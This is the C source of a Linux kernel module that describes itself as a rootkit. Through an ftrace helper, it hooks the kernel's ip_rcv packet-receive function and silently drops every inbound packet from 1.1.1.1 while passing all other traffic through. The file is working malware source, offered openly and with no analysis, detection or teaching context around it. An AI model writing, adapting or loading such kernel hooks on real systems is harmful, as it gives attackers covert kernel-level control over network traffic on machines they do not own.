#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/tcp.h>
#include <linux/ip.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <net/ip.h>

#include "ftrace_helper2.h"


MODULE_LICENSE("GPL");
MODULE_AUTHOR("ROYCO");
MODULE_DESCRIPTION("a kernel module rootkit");
MODULE_VERSION("1");


 asmlinkage int (*old_ip_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
 	   struct net_device *orig_dev);
 asmlinkage int new_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
 	   struct net_device *orig_dev);

static struct ftrace_hook hooks[] = {
 	HOOK("ip_rcv", new_ip_rcv, &old_ip_rcv),
 };


static int __init rootkit_enter(void) {

	int err;

	printk(KERN_INFO "ip drop rootkit: is operating\n");
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err)
		return err;


	 return 0;
}

static void __exit rootkit_exit(void) {


	//remove ftrace hooks
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "ip drop rootkit: stopped\n");
}



asmlinkage int new_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
	   struct net_device *orig_dev) {

	struct iphdr *ip_header = (struct iphdr *)skb_network_header(skb);
	unsigned int src_ip = (unsigned int)ip_header->saddr;
	unsigned int dest_ip = (unsigned int)ip_header->daddr;
	
	if (src_ip == 0x01010101)
	{
		printk(KERN_INFO "a: found traffic from 1.1.1.1\n");
		return NET_RX_DROP;
	}
	//printk("hooked ip_rcv! hooray\n");
	return old_ip_rcv(skb, dev, pt, orig_dev);


}



module_init(rootkit_enter);
module_exit(rootkit_exit);

